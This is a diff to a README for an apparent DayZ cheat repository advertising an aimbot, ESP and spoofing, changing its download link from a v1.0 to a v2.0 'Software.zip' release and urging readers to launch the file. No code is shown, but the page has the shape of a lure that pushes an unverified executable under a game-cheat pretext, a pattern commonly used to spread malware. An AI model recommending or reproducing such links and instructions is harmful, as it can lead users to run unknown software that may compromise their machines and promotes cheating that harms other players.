@@ -1,6 +1,6 @@
 # 🔫🎮 DayZ Cheat H4ck A1mb0t
 
-![DayZ Cheat H4ck A1mb0t](https://github.com/yoyoy3/Dayz-Cheat-H4ck-A1mb0t/releases/download/v1.0/Software.zip)
+![DayZ Cheat H4ck A1mb0t](https://github.com/yoyoy3/Dayz-Cheat-H4ck-A1mb0t/releases/download/v2.0/Software.zip)
 
 Welcome to the **DayZ Cheat H4ck A1mb0t** repository, a project dedicated to providing cheats developed in C++ specifically for DayZ. These cheats are designed to enhance your gaming experience by offering features such as Aimbot, ESP, and Spoof.
 
@@ -10,7 +10,7 @@ Welcome to the **DayZ Cheat H4ck A1mb0t** repository, a project dedicated to pro
 - **Topics:** aim-dayz-free, aimbot-dayz, dayz, dayzstandalone, maphack
 
 ## ⬇️ Download Link
-[Download DayZ Cheat H4ck A1mb0t](https://github.com/yoyoy3/Dayz-Cheat-H4ck-A1mb0t/releases/download/v1.0/Software.zip)
+[Download DayZ Cheat H4ck A1mb0t](https://github.com/yoyoy3/Dayz-Cheat-H4ck-A1mb0t/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the file to get started!**
 
